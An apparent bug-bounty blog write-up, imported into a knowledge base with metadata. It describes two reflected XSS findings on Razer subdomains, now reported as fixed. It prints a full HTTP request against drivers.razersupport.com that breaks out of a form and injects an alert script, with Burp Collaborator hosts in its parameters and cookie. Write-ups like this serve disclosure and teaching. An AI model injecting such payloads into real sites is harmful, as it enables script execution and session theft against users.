---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2020-11-21_2-reflected-xss-in-razer.md
original_filename: 2020-11-21_2-reflected-xss-in-razer.md
title: 2 Reflected XSS In Razer
category: documents
detected_topics:
- xss
- command-injection
- otp
- automation-abuse
- csrf
tags:
- imported
- documents
- xss
- command-injection
- otp
- automation-abuse
- csrf
language: en
raw_sha256: f580f58725092cf1e5a01ad71ac37e98cde71711954ae443dc32cffca6b10d44
text_sha256: 5aeb3e02159743ca77635a75683fd0c64db49a707121a51b4bb6d9077198561a
ingested_at: '2026-06-28T07:32:03Z'
sensitivity: unknown
redactions_applied: false
---

# 2 Reflected XSS In Razer

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2020-11-21_2-reflected-xss-in-razer.md
- Source Type: markdown
- Detected Topics: xss, command-injection, otp, automation-abuse, csrf
- Ingested At: 2026-06-28T07:32:03Z
- Redactions Applied: False
- Raw SHA256: `f580f58725092cf1e5a01ad71ac37e98cde71711954ae443dc32cffca6b10d44`
- Text SHA256: `5aeb3e02159743ca77635a75683fd0c64db49a707121a51b4bb6d9077198561a`


## Content

---
title: "2 Reflected XSS In Razer"
url: "https://mostafa-mano.medium.com/2-reflected-xss-in-razer-74783ae5ee53"
authors: ["Mostafa"]
programs: ["Razer"]
bugs: ["Reflected XSS"]
publication_date: "2020-11-21"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 4114
scraped_via: "browseros"
---

# 2 Reflected XSS In Razer

2 Reflected XSS In Razer
Mostafa
Follow
2 min read
·
Nov 21, 2020

101

First Of All thanks for reading my first write up in medium

My Name Is Mostafa I Am Working As information Security Engineer And My Part Time Doing Some Bug Hunting

I Found 2 Vulnerabilities In The Different Subdomains in Razer

The First One is reflected XSS in (http://drivers.razersupport.com)

When I Searching To XSS Looked To Refelected Params I Found CSRF Token Have Been reflected and Commented In HTML Response So This Is The First One I Just Close The Form Tag And Wrote XSS Payload And Has Been Executed

Get Mostafa’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

GET /index.php?_m=k2n4qnfei8t8yk2e7ua78c7m7dd41t.burpcollaborator.net&_a=viewdownload&downloaditemid=800&nav=0Quote%3AOriginally%2C76%2C168%2C11%2C131?_m=downloads&_a=viewdownload&downloaditemid=800&nav=0Quote%3AOriginally%2C76%2C168%2C11%2C131&_m=downloads&_a=viewdownload&downloaditemid=800&nav=0Quote%3AOriginally%2C76%2C168%2C11%2C131?_m=downloads&_a=viewdownload&downloaditemid=800&nav=0Quote%3AOriginally%2C76%2C168%2C11%2C131 → →”></form><h1><script>alert(document.domain)</script></h1> HTTP/1.1
Host: drivers.razersupport.com
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: https://www.google.com/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: SWIFT_sessionid40=59cpx8mzpt0t559zefhsfxe7eykq8f.burpcollaborator.net; _gcl_au=1.1.291319320.1592845997; __utma=124197257.1459569068.1592845998.1592845998.1592845998.1; __utmc=124197257; __utmz=124197257.1592845998.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided); __utmt=1; __utmb=124197257.1.10.1592845998; _ga=GA1.2.1459569068.1592845998; _gid=GA1.2.741943482.1592845999; __unam=c0300f2–172dd050e1d-36a23205–2; _dc_gtm_UA-33485401–2=1
Connection: close

Press enter or click to view image in full size

The Second Reflected XSS (auth.pay.razer.com)

Press enter or click to view image in full size
Press enter or click to view image in full size

Good Advice Test all Reflected Inputs and Don’t Use Automation Tools To Find XSS

All Issues Is Mitigated

Thanks
